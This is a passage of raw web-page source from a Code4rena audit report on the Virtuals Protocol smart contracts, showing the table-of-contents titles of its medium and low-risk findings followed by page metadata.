\u003ccode\u003eFPair\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-06-bondingtax-has-invalid-slippage-implementation\"\u003e[M-06] \u003ccode\u003eBondingTax\u003c/code\u003e has invalid slippage implementation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage\"\u003e[M-07] \u003ccode\u003eamountOutMin\u003c/code\u003e passed in as 0 in \u003ccode\u003eAgentToken::_swapTax\u003c/code\u003e leads to loss of funds due to slippage\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals\"\u003e[M-08] Score in \u003ccode\u003eAgentDAO\u003c/code\u003e is not an accurate measure and can be artificially inflated by spamming proposals\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-09-functions-in-ferc20-cant-be-invoked\"\u003e[M-09] Functions in FERC20 can’t be invoked\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation\"\u003e[M-10] Missing \u003ccode\u003etotalSupply\u003c/code\u003e reduction in \u003ccode\u003eburnFrom\u003c/code\u003e allows supply manipulation (ERC20 Violation)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts\"\u003e[M-11] \u003ccode\u003eAgentDAO::_castVote\u003c/code\u003e doesn’t check the array of votes emitted, which determine the number of battles fought in \u003ccode\u003eEloCalculator.sol\u003c/code\u003e, allowing the user to increase the ELO of a contribution unfairly, inflating the maturity/impact of \u003ccode\u003eServiceNFTs\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-12-no-slippage-protection-during-adding-liquidity-to-uniswap\"\u003e[M-12] No slippage protection during adding liquidity to uniswap\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps\"\u003e[M-13] Removal of a liquidity pool on \u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e still incurs taxes on swaps\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards\"\u003e[M-14] \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e bypasses the \u003ccode\u003eaddValidator\u003c/code\u003e call, leads to a non-validator holding voting power along with loss of rewards\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert\"\u003e[M-15] If \u003ccode\u003eFFactory::buyTax\u003c/code\u003e and / or \u003ccode\u003eFFactory::sellTax\u003c/code\u003e is set to 0, buy / sell would revert\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-16-elo-calculation-error\"\u003e[M-16] \u003ccode\u003eElo\u003c/code\u003e calculation error\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times\"\u003e[M-17] \u003ccode\u003eVirtualGenesisDAO.sol:earlyExecute()\u003c/code\u003e proposals can be executed two times\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first\"\u003e[M-18] \u003ccode\u003eGenesis.sol:onGenesisSuccess()\u003c/code\u003e users may lose their unclaimed \u003ccode\u003eagentTokens\u003c/code\u003e if a second launch occurs before they’ve claimed their rewards from the first\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals\"\u003e[M-19] Lack of maturity check for non-founder users allowing immediate withdrawals\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity\"\u003e[M-20] Delegation not revoked on withdrawal allows reward and voting power inflation post-maturity\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting\"\u003e[M-21] \u003ccode\u003ebattleElo\u003c/code\u003e is at risk of underflow revert, which may DOS voting\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken\"\u003e[M-22] Founder has to double-stake during migration with the initial LP locked in the old \u003ccode\u003eveToken\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds\"\u003e[M-23] Using \u003ccode\u003eAgentFactory::setAssetToken\u003c/code\u003e will lead to loss of funds\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-24-precision-loss-in-pricealast-and-priceblast\"\u003e[M-24] Precision loss in \u003ccode\u003epriceALast\u003c/code\u003e and \u003ccode\u003epriceBLast\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-25-incorrect-mathematical-logic\"\u003e[M-25] Incorrect mathematical logic\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router\"\u003e[M-26] Imprecise calculations in \u003ccode\u003elaunchFor()\u003c/code\u003e lead to less liquidity be added to the pair via the router\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#low-risk-and-non-critical-issues\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#01-missing-update-of-prevagentid-in-promptmulti\"\u003e01 Missing update of \u003ccode\u003eprevAgentId\u003c/code\u003e in \u003ccode\u003epromptMulti\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#02-duplicate-import-statement-for-mathsol\"\u003e02 Duplicate import statement for \u003ccode\u003eMath.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#03-invalid-agentid-leads-to-token-burning\"\u003e03 Invalid \u003ccode\u003eagentId\u003c/code\u003e leads to token burning\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#04-risky-one-step-admin-transfer-in-contributionnftsol\"\u003e04 Risky one-step admin transfer in \u003ccode\u003eContributionNft.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#05-fee-induced-reserve-inconsistency-in-frouter\"\u003e05 Fee-induced reserve inconsistency in \u003ccode\u003eFRouter\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol\"\u003e06 Duplicate import statement for \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e in \u003ccode\u003eFGenesis.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#07-misconception-in-using-blocktimestamp--x-for-swap-deadlines\"\u003e07 Misconception in using \u003ccode\u003eblock.timestamp + X\u003c/code\u003e for swap deadlines\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#08-widespread-use-of-infinite-token-approvals\"\u003e08 Widespread use of infinite token approvals\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#09-missing-virtual-functions-for-inheritance\"\u003e09 Missing \u003ccode\u003evirtual\u003c/code\u003e functions for inheritance\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#10-totalsupply-not-updated-on-burning-in-ferc20\"\u003e10 \u003ccode\u003etotalSupply\u003c/code\u003e not updated on burning in \u003ccode\u003eFERC20\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#11-wrong-max-transaction-limit-after-burns\"\u003e11 Wrong max transaction limit after burns\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#disclosures\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e"])</script><script>self.__next_f.push([1,"1b:{\"name\":\"Virtuals Protocol\",\"link\":\"https://x.com/virtuals_io\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-vhVEYuJvCb2\"}\n1c:{\"start_time\":\"2025-04-17T20:00:00.000Z\",\"end_time\":\"2025-05-07T20:00:00.000Z\",\"bot_race_time_limit\":1}\n18:{\"uid\":\"vZZjWu5ZovA\",\"slug\":\"2025-04-virtuals-protocol\",\"title\":\"Virtuals Protocol\",\"sponsor\":\"Virtuals Protocol\",\"date\":\"2025-08-04\",\"findings\":\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions\",\"contest\":490,\"alt_url\":null,\"html\":\"$19\",\"toc\":\"$1a\",\"created_at\":\"2025-08-05T18:56:55.702Z\",\"updated_at\":\"2025-08-05T18:56:55.702Z\",\"sponsor_data\":\"$1b\",\"contest_data\":\"$1c\"}\n8:[\"$\",\"$L13\",null,{\"landingPage\":[\"$\",\"$L14\",null,{\"report\":{\"uid\":\"vZZjWu5ZovA\",\"slug\":\"2025-04-virtuals-protocol\",\"title\":\"Virtuals Protocol\",\"sponsor\":\"Virtuals Protocol\",\"date\":\"2025-08-04\",\"findings\":\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions\",\"contest\":490,\"alt_url\":null,\"html\":\"$15\",\"toc\":\"$16\",\"created_at\":\"2025-08-05T18:56:55.702Z\",\"updated_at\":\"2025-08-05T18:56:55.702Z\",\"sponsor_data\":{\"name\":\"Virtuals Protocol\",\"link\":\"https://x.com/virtuals_io\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-vhVEYuJvCb2\"},\"contest_data\":{\"start_time\":\"2025-04-17T20:00:00.000Z\",\"end_time\":\"2025-05-07T20:00:00.000Z\",\"bot_race_time_limit\":1}}}],\"coreAppPage\":[\"$\",\"$L17\",null,{\"report\":\"$18\"}]}]\ne:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"application-name\",\"content\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Code4rena is "])</script><script>self.__next_f.push([1,"a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"link\",\"14\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"256x256\"}],[\"$\",\"link\",\"15\",{\"rel\":\"icon\",\"href\":\"/logos/c4/c4-favicon-32.png\"}],[\"$\",\"link\",\"16\",{\"rel\":\"apple-touch-icon\",\"href\":\"/logos/c4/apple-touch-icon.png\"}],[\"$\",\"meta\",\"17\",{\"name\":\"next-size-adjust\"}]]\n7:null\n"])</script></body></html>